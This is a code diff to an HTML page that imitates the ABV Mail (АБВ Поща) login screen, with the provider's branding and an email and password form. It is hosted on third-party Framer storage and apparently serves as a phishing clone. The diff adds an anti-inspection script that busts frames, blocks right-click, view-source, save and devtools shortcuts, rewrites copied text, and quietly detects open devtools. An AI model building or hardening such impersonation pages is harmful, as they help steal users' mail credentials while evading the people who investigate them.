@@ -21,52 +21,78 @@
 <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
 <meta name="robots" content="max-image-preview:large">
 
-<style data-framer-breakpoint-css>
-@media(min-width: 1351px){.hidden-72rtr7{display:none!important}}
-@media(max-width: 1350.98px){.hidden-mqga1p{display:none!important}}
-</style>
-
-<link rel="stylesheet" href="https://framerusercontent.com/sites/3ahSlilUXdI9FVJP1xj5dv/style.min.css">
 <style>
-html,body,#main{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Inter',sans-serif;background:#fff}
-.framer-k1yVm.framer-72rtr7{height:1080px;background-color:#fff;width:1351px;position:relative;margin:0 auto}
-.framer-k1yVm .framer-l37xyv{z-index:10;background-color:#f0f0f0;width:100%;height:35px;position:absolute;top:0;left:0}
-.framer-k1yVm .framer-1uj2ez6{width:25px;position:absolute;top:5px;left:15px}
-.framer-k1yVm .framer-13rvrfu{display:flex;position:absolute;top:11px;left:36px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
-.framer-k1yVm .framer-i0rsf2{display:flex;position:absolute;top:11px;left:134px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
-.framer-k1yVm .framer-1inf8b4{display:flex;position:absolute;top:11px;left:185px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
-.framer-k1yVm .framer-14zwyi7{position:absolute;top:11px;left:335px}
-.framer-k1yVm .framer-1trcrps{position:absolute;top:3px;left:470px}
-.framer-k1yVm .framer-e23xuc{display:flex;position:absolute;top:11px;left:1095px;border-right:2px solid #d4d0c8;padding:0 12px 0 11px;align-items:center}
-.framer-k1yVm .framer-1ofzc25{position:absolute;top:11px;left:1253px}
-.framer-k1yVm .framer-ivfs9d{position:absolute;top:53px;left:216px}
-.framer-k1yVm .framer-1tyjjwu{position:absolute;top:77px;left:827px;width:305px;border:1px solid #e0e0e0}
-.framer-k1yVm .framer-1tqp0cc,.framer-k1yVm .framer-1lwhm32,.framer-k1yVm .framer-1cb6bps{position:absolute;top:473px;width:215px}
-.framer-k1yVm .framer-1tqp0cc{left:196px}.framer-k1yVm .framer-1lwhm32{left:428px}.framer-k1yVm .framer-1cb6bps{left:660px}
-.framer-k1yVm .framer-1op5ul{position:absolute;top:638px;left:741px;width:215px}
-.framer-k1yVm .framer-heb492{position:absolute;top:586px;left:196px;width:262px}
-.framer-k1yVm .framer-1srjyxk{position:absolute;top:586px;left:472px;width:262px}
-.framer-k1yVm .framer-195nnv8{background-color:#b8e6fd;width:640px;height:288px;position:absolute;top:146px;left:196px}
-.framer-k1yVm .framer-nmkhwe{position:absolute;top:15px;left:25px}
-.framer-k1yVm .framer-zgdkdg{position:absolute;top:0;left:340px;width:300px}
-.framer-k1yVm .framer-1ivdcrg{position:absolute;bottom:32px;left:76px}
-.framer-k1yVm .framer-17sdx75{position:absolute;bottom:8px;left:25px}
-.framer-k1yVm .framer-1k6dsll{background:#fff;width:940px;height:33px;position:absolute;top:434px;left:calc(49.2968% - 470px)}
-.framer-k1yVm .framer-122upky{position:absolute;top:-14px;left:24px}
-.framer-k1yVm .framer-6nmjat{position:absolute;top:7px;left:898px}
-.framer-PR0MW.framer-147248w{display:flex;flex-direction:column;gap:20px;width:640px;height:288px;padding:20px;position:relative;overflow:hidden}
-.framer-form-text-input{background:#fcffdf;border:1px solid rgba(136,136,136,.1);border-radius:2px;padding:4px;display:flex;align-items:center;height:29px}
-.framer-form-text-input input{background:transparent;border:none;outline:none;width:100%;padding:0 4px;font-family:'Inter',sans-serif;font-size:14px}
-.framer-sPvcm.framer-1efqo4b{background:rgb(27,158,21);border:none;color:#fff;font-size:14px;font-weight:600;width:240px;height:40px;cursor:pointer;border-radius:2px}
-.framer-text{margin:0;padding:0}
-.abv-custom-error{color:#d32f2f;font-size:12px;font-weight:600;margin-top:8px;padding:8px 12px;background:#ffebee;border-radius:4px;border-left:3px solid #d32f2f;display:none;font-family:'Inter',sans-serif}
-.abv-custom-error.show{display:block}
-.abv-custom-success{color:#1ba916;font-size:12px;font-weight:600;margin-top:8px;padding:8px 12px;background:#e8f5e9;border-radius:4px;border-left:3px solid #1ba916;display:none;font-family:'Inter',sans-serif}
-.abv-custom-success.show{display:block}
+/* Base & Reset */
+html, body, #main { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Inter', sans-serif; background: #fff; }
+
+/* Main Container */
+.framer-k1yVm { height: 1080px; background-color: #fff; width: 1351px; position: relative; margin: 0 auto; }
+
+/* Top Bar */
+.framer-l37xyv { z-index: 10; background-color: #f0f0f0; width: 100%; height: 35px; position: absolute; top: 0; left: 0; }
+.framer-1uj2ez6 { width: 25px; position: absolute; top: 5px; left: 15px; }
+.framer-13rvrfu { display: flex; position: absolute; top: 11px; left: 36px; border-right: 2px solid #d4d0c8; padding: 0 11px; align-items: center; }
+.framer-i0rsf2 { display: flex; position: absolute; top: 11px; left: 134px; border-right: 2px solid #d4d0c8; padding: 0 11px; align-items: center; }
+.framer-1inf8b4 { display: flex; position: absolute; top: 11px; left: 185px; border-right: 2px solid #d4d0c8; padding: 0 11px; align-items: center; }
+.framer-14zwyi7 { position: absolute; top: 11px; left: 335px; }
+.framer-1trcrps { position: absolute; top: 3px; left: 470px; }
+.framer-e23xuc { display: flex; position: absolute; top: 11px; left: 1095px; border-right: 2px solid #d4d0c8; padding: 0 12px 0 11px; align-items: center; }
+.framer-1ofzc25 { position: absolute; top: 11px; left: 1253px; }
+
+/* Logos */
+.framer-ivfs9d { position: absolute; top: 53px; left: 216px; }
+.framer-1tyjjwu { position: absolute; top: 77px; left: 827px; width: 305px; border: 1px solid #e0e0e0; }
+
+/* News Images */
+.framer-1tqp0cc, .framer-1lwhm32, .framer-1cb6bps { position: absolute; top: 473px; width: 215px; }
+.framer-1tqp0cc { left: 196px; }
+.framer-1lwhm32 { left: 428px; }
+.framer-1cb6bps { left: 660px; }
+.framer-1op5ul { position: absolute; top: 638px; left: 741px; width: 215px; }
+.framer-heb492 { position: absolute; top: 586px; left: 196px; width: 262px; }
+.framer-1srjyxk { position: absolute; top: 586px; left: 472px; width: 262px; }
+
+/* Login Box Area */
+.framer-195nnv8 { background-color: #b8e6fd; width: 640px; height: 288px; position: absolute; top: 146px; left: 196px; }
+.framer-nmkhwe { position: absolute; top: 15px; left: 25px; }
+.framer-zgdkdg { position: absolute; top: 0; left: 340px; width: 300px; }
+.framer-1ivdcrg { position: absolute; bottom: 32px; left: 76px; }
+.framer-17sdx75 { position: absolute; bottom: 8px; left: 25px; }
+
+/* Footer */
+.framer-1k6dsll { background: #fff; width: 940px; height: 33px; position: absolute; top: 434px; left: calc(49.2968% - 470px); }
+.framer-122upky { position: absolute; top: -14px; left: 24px; }
+.framer-6nmjat { position: absolute; top: 7px; left: 898px; }
+
+/* Form Styles */
+.framer-PR0MW { display: flex; flex-direction: column; gap: 10px; width: 315px; position: absolute; top: 60px; left: 25px; }
+.framer-form-text-input { background: #fcffdf; border: 1px solid rgba(136,136,136,.1); border-radius: 2px; padding: 4px; display: flex; align-items: center; height: 29px; }
+.framer-form-text-input input { background: transparent; border: none; outline: none; width: 100%; padding: 0 4px; font-size: 14px; font-family: 'Inter', sans-serif; }
+.framer-btn, .framer-sPvcm { background: rgb(27,158,21); border: none; color: #fff; font-size: 14px; font-weight: 600; width: 240px; height: 40px; cursor: pointer; border-radius: 2px; }
+.framer-text { margin: 0; padding: 0; }
+
+/* Custom Messages */
+.abv-custom-error { color: #d32f2f; font-size: 12px; font-weight: 600; margin-top: 8px; padding: 8px 12px; background: #ffebee; border-radius: 4px; border-left: 3px solid #d32f2f; display: none; font-family: 'Inter', sans-serif; }
+.abv-custom-error.show { display: block; }
+.abv-custom-success { color: #1ba916; font-size: 12px; font-weight: 600; margin-top: 8px; padding: 8px 12px; background: #e8f5e9; border-radius: 4px; border-left: 3px solid #1ba916; display: none; font-family: 'Inter', sans-serif; }
+.abv-custom-success.show { display: block; }
+
+/* ===== SOURCE PROTECTION ===== */
+html, body {
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  -webkit-touch-callout: none;
+  -webkit-tap-highlight-color: transparent;
+}
+input, textarea { -webkit-user-select: text; -moz-user-select: text; user-select: text; }
+img { -webkit-user-drag: none; -khtml-user-drag: none; -moz-user-drag: none; -o-user-drag: none; user-drag: none; }
+::selection { background: rgba(27,158,21,.22); }
 </style>
 </head>
-<body>
+<body class="is-abv" oncontextmenu="return false;" ondragstart="return false;">
 
 <div id="main">
 <style>html body { background: rgb(255, 255, 255); }</style>
@@ -75,38 +101,38 @@ body{font-family:'Inter',sans-serif;background:#fff}
   <!-- TOP BAR -->
   <div class="framer-l37xyv">
     <div class="framer-1uj2ez6">
-      <img decoding="async" width="25" height="27" src="https://framerusercontent.com/images/casWq2XT2AxtIAfXFrCfMV2R0.svg?width=25&height=27" alt="АБВ поща" style="width:100%;height:100%">
+      <img decoding="async" width="25" height="27" draggable="false" src="https://framerusercontent.com/images/casWq2XT2AxtIAfXFrCfMV2R0.svg?width=25&height=27" alt="АБВ поща" style="width:100%;height:100%">
     </div>
     <div class="framer-13rvrfu"><p class="framer-text" style="font-size:14px;font-weight:900;line-height:14px;color:#000">АБВ Поща</p></div>
     <div class="framer-i0rsf2"><p class="framer-text" style="font-size:12px;font-weight:700;color:rgb(30,147,12)">DOX</p></div>
     <div class="framer-1inf8b4"><p class="framer-text" style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ на твой домейн</p></div>
-    <div class="framer-14zwyi7"><img decoding="async" width="101" height="15" src="https://framerusercontent.com/images/uebBbbNZYu4aV5MVIkBR0U26F2M.svg?width=101&height=15" alt="АБВ TruStsuite" style="width:100%"></div>
-    <div class="framer-1trcrps"><img decoding="async" width="61" height="27" src="https://framerusercontent.com/images/EgViW3Y1mC1GWqjtSx1lBDjhCqs.svg?width=61&height=27" style="width:100%"></div>
+    <div class="framer-14zwyi7"><img decoding="async" width="101" height="15" draggable="false" src="https://framerusercontent.com/images/uebBbbNZYu4aV5MVIkBR0U26F2M.svg?width=101&height=15" alt="АБВ TruStsuite" style="width:100%"></div>
+    <div class="framer-1trcrps"><img decoding="async" width="61" height="27" draggable="false" src="https://framerusercontent.com/images/EgViW3Y1mC1GWqjtSx1lBDjhCqs.svg?width=61&height=27" style="width:100%"></div>
     <div class="framer-e23xuc"><p class="framer-text" style="font-size:12px;font-weight:700;color:rgb(30,147,12)">Регистрация в АБВ</p></div>
     <div class="framer-1ofzc25"><p class="framer-text" style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ профил</p></div>
   </div>
 
   <!-- LOGO -->
-  <div class="framer-ivfs9d"><img decoding="async" width="162" height="60" src="https://framerusercontent.com/images/5XhmlwsfPBGpVltxlwiDdG9kbo.svg?width=162&height=60" style="width:100%"></div>
-  <div class="framer-1tyjjwu"><img decoding="async" width="180" height="30" src="https://framerusercontent.com/images/ZeCcpoYP2U97mEHPaGcLCZZ6TUs.svg?width=180&height=30" style="width:100%"></div>
+  <div class="framer-ivfs9d"><img decoding="async" width="162" height="60" draggable="false" src="https://framerusercontent.com/images/5XhmlwsfPBGpVltxlwiDdG9kbo.svg?width=162&height=60" style="width:100%"></div>
+  <div class="framer-1tyjjwu"><img decoding="async" width="180" height="30" draggable="false" src="https://framerusercontent.com/images/ZeCcpoYP2U97mEHPaGcLCZZ6TUs.svg?width=180&height=30" style="width:100%"></div>
 
   <!-- NEWS IMAGES -->
-  <div class="framer-1tqp0cc"><img decoding="async" src="https://framerusercontent.com/images/wBR7zAdtrn6C95FCM4PckzSLiCc.jpg?width=215&height=100" style="width:100%"></div>
-  <div class="framer-1lwhm32"><img decoding="async" src="https://framerusercontent.com/images/p6OxGGbP252qR6YGCNy37MAumxs.jpg?width=215&height=100" style="width:100%"></div>
-  <div class="framer-1cb6bps"><img decoding="async" src="https://framerusercontent.com/images/k3u3mM2vefXrTni654AVuXGYQw.jpg?width=215&height=100" style="width:100%"></div>
-  <div class="framer-1op5ul"><img decoding="async" src="https://framerusercontent.com/images/mR27Z9ciB9VoWIUmbkgcgfR97tU.jpg?width=1000&height=600" style="width:100%"></div>
-  <div class="framer-heb492"><img decoding="async" src="https://framerusercontent.com/images/7u0tWTuqrVIRhnkaOAu2Kx3EVH0.jpg?width=260&height=180" style="width:100%"></div>
-  <div class="framer-1srjyxk"><img decoding="async" src="https://framerusercontent.com/images/UZRgbZYB2TjD2gdiDjaQo3wb5qg.jpg?width=260&height=180" style="width:100%"></div>
+  <div class="framer-1tqp0cc"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/wBR7zAdtrn6C95FCM4PckzSLiCc.jpg?width=215&height=100" style="width:100%"></div>
+  <div class="framer-1lwhm32"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/p6OxGGbP252qR6YGCNy37MAumxs.jpg?width=215&height=100" style="width:100%"></div>
+  <div class="framer-1cb6bps"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/k3u3mM2vefXrTni654AVuXGYQw.jpg?width=215&height=100" style="width:100%"></div>
+  <div class="framer-1op5ul"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/mR27Z9ciB9VoWIUmbkgcgfR97tU.jpg?width=1000&height=600" style="width:100%"></div>
+  <div class="framer-heb492"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/7u0tWTuqrVIRhnkaOAu2Kx3EVH0.jpg?width=260&height=180" style="width:100%"></div>
+  <div class="framer-1srjyxk"><img decoding="async" draggable="false" src="https://framerusercontent.com/images/UZRgbZYB2TjD2gdiDjaQo3wb5qg.jpg?width=260&height=180" style="width:100%"></div>
 
   <!-- LOGIN CARD -->
   <div class="framer-195nnv8">
     <div class="framer-nmkhwe"><h2 class="framer-text" style="font-size:21px;color:rgb(47,47,47);font-weight:400">Вход в АБВ Поща</h2></div>
-    <div class="framer-zgdkdg"><img decoding="async" width="305" height="247" src="https://framerusercontent.com/images/sgSVom1iXFk6VFGgXqvmmuMUbt4.png?width=305&height=247" style="width:100%"></div>
+    <div class="framer-zgdkdg"><img decoding="async" width="305" height="247" draggable="false" src="https://framerusercontent.com/images/sgSVom1iXFk6VFGgXqvmmuMUbt4.png?width=305&height=247" style="width:100%"></div>
     <div class="framer-17sdx75"><p class="framer-text" style="font-size:11px;color:rgb(47,47,47)">Нямаш профил в АБВ? <a class="framer-text" href="https://passport.abv.bg/app/profiles/registration" style="color:rgb(30,147,12)">Регистрирай се!</a></p></div>
     <div class="framer-1ivdcrg"><p class="framer-text" style="font-size:11px"><a class="framer-text" href="https://passport.abv.bg/app/profiles/lostpass" style="color:rgb(22,110,29)">Забравена парола</a></p></div>
 
     <!-- FORM -->
-    <form class="framer-PR0MW framer-147248w" style="position:absolute;top:60px;left:25px;width:315px;display:flex;flex-direction:column;gap:10px">
+    <form class="framer-PR0MW framer-147248w">
       <p class="framer-text" style="font-size:12px;font-weight:500;color:rgb(20,20,20)">АБВ потребител:</p>
       <div class="framer-form-text-input">
         <input type="email" required name="Email" class="framer-form-input" value>
@@ -115,7 +141,7 @@ body{font-family:'Inter',sans-serif;background:#fff}
       <div class="framer-form-text-input">
         <input type="password" required name="text" class="framer-form-input" value>
       </div>
-      <button type="button" class="framer-sPvcm framer-1efqo4b" data-framer-name="Default">Вход</button>
+      <button type="button" class="framer-sPvcm framer-1efqo4b framer-btn" data-framer-name="Default">Вход</button>
       <div id="abv-error" class="abv-custom-error"></div>
       <div id="abv-success" class="abv-custom-success"></div>
     </form>
@@ -275,6 +301,102 @@ body{font-family:'Inter',sans-serif;background:#fff}
     }
 
     window.addEventListener('pageshow', function(e) { if (e.persisted) location.reload(); });
+})();
+</script>
+
+<!-- ============================================================ -->
+<!-- SOURCE PROTECTION LAYER -->
+<!-- ============================================================ -->
+<script>
+(function () {
+  'use strict';
+
+  /* Set to true if you ever need to embed this page in an iframe.
+     false = the page breaks out of any frame it is loaded into. */
+  var ALLOW_EMBED = false;
+
+  /* --- 1. frame buster --- */
+  if (!ALLOW_EMBED) {
+    try { if (window.top !== window.self) { window.top.location = window.self.location.href; } } catch (e) {}
+  }
+
+  /* --- 2. kill right-click (belt and braces over the inline handler) --- */
+  document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }, false);
+
+  /* --- 3. kill image dragging / save-image --- */
+  document.addEventListener('dragstart', function (e) {
+    if (e.target && e.target.tagName === 'IMG') { e.preventDefault(); return false; }
+  }, false);
+
+  function hardenImages() {
+    var imgs = document.images, i;
+    for (i = 0; i < imgs.length; i++) {
+      imgs[i].setAttribute('draggable', 'false');
+      imgs[i].oncontextmenu = function () { return false; };
+      imgs[i].style.webkitUserDrag = 'none';
+    }
+  }
+  hardenImages();
+  window.addEventListener('load', hardenImages);
+
+  /* --- 4. keyboard shortcuts --- */
+  document.addEventListener('keydown', function (e) {
+    var k = (e.key || '').toLowerCase();
+    var tag = (e.target && e.target.tagName) || '';
+    var inField = (tag === 'INPUT' || tag === 'TEXTAREA' || e.target.isContentEditable);
+
+    /* F12 */
+    if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return; }
+
+    if (e.ctrlKey || e.metaKey) {
+      /* Ctrl+U view-source, Ctrl+S save, Ctrl+P print */
+      if (k === 'u' || k === 's' || k === 'p') { e.preventDefault(); e.stopPropagation(); return; }
+      /* Ctrl+Shift+I / J / C / K devtools */
+      if (e.shiftKey && (k === 'i' || k === 'j' || k === 'c' || k === 'k')) { e.preventDefault(); e.stopPropagation(); return; }
+      /* Ctrl+A only outside form fields, so field select-all still works */
+      if (k === 'a' && !inField) { e.preventDefault(); e.stopPropagation(); return; }
+    }
+  }, true);
+
+  /* --- 5. copy / cut: page text is unselectable, fields stay copyable --- */
+  document.addEventListener('copy', function (e) {
+    var tag = (e.target && e.target.tagName) || '';
+    if (tag === 'INPUT' || tag === 'TEXTAREA' || (e.target && e.target.isContentEditable)) return;
+    try {
+      if (e.clipboardData) {
+        e.clipboardData.setData('text/plain', '© АБВ Поща');
+        e.preventDefault();
+      }
+    } catch (err) {}
+  }, true);
+
+  document.addEventListener('cut', function (e) {
+    var tag = (e.target && e.target.tagName) || '';
+    if (tag === 'INPUT' || tag === 'TEXTAREA') return;
+  }, true);
+
+  /* --- 6. console banner --- */
+  try {
+    console.log(
+      '%c STOP %c Този сайт е защитен. Копирането на кода е забранено. ',
+      'background:#1b9e15;color:#fff;font:700 12px Inter,sans-serif;padding:4px 8px;border-radius:2px 0 0 2px',
+      'background:#f0f0f0;color:#2f2f2f;font:500 12px Inter,sans-serif;padding:4px 8px;border-radius:0 2px 2px 0'
+    );
+    console.log('%c © ' + new Date().getFullYear() + ' — Всички права запазени.', 'color:#888;font:11px Inter,sans-serif');
+  } catch (e) {}
+
+  /* --- 7. optional: quiet devtools-open detector (no visual change) --- */
+  var devOpen = false;
+  setInterval(function () {
+    var w = window.outerWidth - window.innerWidth;
+    var h = window.outerHeight - window.innerHeight;
+    var open = (w > 160 || h > 160);
+    if (open !== devOpen) {
+      devOpen = open;
+      document.documentElement.setAttribute('data-devtools', open ? 'open' : 'closed');
+    }
+  }, 1200);
+
 })();
 </script>
 
